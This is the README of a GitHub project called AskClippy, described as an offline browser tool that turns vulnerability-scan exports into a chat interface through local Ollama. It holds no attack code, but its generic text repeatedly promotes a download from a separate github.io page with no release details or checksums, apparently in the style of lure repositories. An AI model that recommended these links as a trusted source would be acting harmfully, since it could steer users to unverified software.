# AskClippy v2026 - offline AI knowledge pipeline 2026

> **AskClippy converts vulnerability management exports into a local, browser-driven knowledge pipeline, delivering chat-like answers via Ollama for offline and intranet deployments.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mooredaniel25/askclippy-offline-v2026-ai-hub?style=flat-square)](https://github.com/mooredaniel25/askclippy-offline-v2026-ai-hub)

---

<p align="center">
  <a href="https://mooredaniel25.github.io/askclippy-offline-v2026-ai-hub/">
    <img src="https://img.shields.io/badge/Download-AskClippy%20Latest-brightgreen?style=for-the-badge" alt="Download AskClippy">
  </a>
</p>

> **[Download AskClippy v2026](https://mooredaniel25.github.io/askclippy-offline-v2026-ai-hub/)**

---

[Download Latest Build](https://mooredaniel25.github.io/askclippy-offline-v2026-ai-hub/)

---

## What AskClippy Does

AskClippy is a browser-based way to turn vulnerability management exports into a searchable local knowledge layer. It takes CSV and JSON scan data, keeps it organized on your side, and makes the results easier to navigate through conversational queries.

It is a strong fit when you need a private workflow that still works without internet access. Because it is built with air-gapped and intranet scenarios in mind, AskClippy lets teams review scan output without relying on external services for every question.

---

## Capabilities

- Imports scan results from CSV and JSON files
- Supports offline-capable local search
- Connects to Ollama for private AI responses
- Runs in the browser for a simple web-based workflow
- Includes an animated Clippy assistant for guided interaction
- Fits air-gap and intranet environments
- Designed around a vulnerability management knowledge pipeline
- Helps convert scan output into chat-friendly answers

---

## Getting Started

1. Download or clone the repository.
2. Open the project in your preferred web hosting or local web server setup.
3. Make sure your scan exports are available in CSV or JSON format.
4. If you want AI responses, prepare a local Ollama instance before first use.

Example:

`git clone https://github.com/mooredaniel25/askclippy-offline-v2026-ai-hub.git

After that, open the app from your local server or deployment target and load your dataset.

---

## How to Use It

1. Open AskClippy in a browser.
2. Import CSV or JSON output from your vulnerability management tool.
3. Search the ingested content locally.
4. Ask questions in chat form to explore the imported findings.
5. If configured, route prompts through Ollama for local model responses.

Typical workflow:

- Export scan data from your VM platform
- Load the file into AskClippy
- Review matches and context in the browser
- Ask follow-up questions to refine your analysis

---

## Configuration

How you configure AskClippy depends on your deployment model and how it connects to local services.

In most setups, the relevant settings live in the app's local deployment files or browser-side configuration. If you are using Ollama, point AskClippy to the local Ollama endpoint used in your environment.

Example:

    {
      "ollamaEndpoint": "http://localhost:11434",
      "dataFormat": "csv",
      "mode": "offline"
    }

For internal hosting, make sure the data source paths and model endpoint match your network layout.

---

## Requirements

- Web browser
- CSV or JSON scan exports
- Local storage or hosting for the web application
- Ollama for local AI responses, if enabled
- Network access only as needed for your deployment model
- Suitable environment for offline, air-gapped, or intranet use

---

## FAQ

**Does AskClippy need internet access?**  
No. It is meant for offline-capable and intranet-friendly environments, depending on how you deploy it.

**Which file types are supported?**  
It imports CSV and JSON scan data.

**How do I enable AI-style responses?**  
Connect the app to a local Ollama instance so queries can be handled through your own environment.

**What should I check if content is not loading?**  
Review the browser console, confirm the data file format, and verify that your local deployment and Ollama endpoint are reachable in your setup.

**How are updates delivered?**  
Use the repository or release source associated with your deployment to pull the latest build when available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
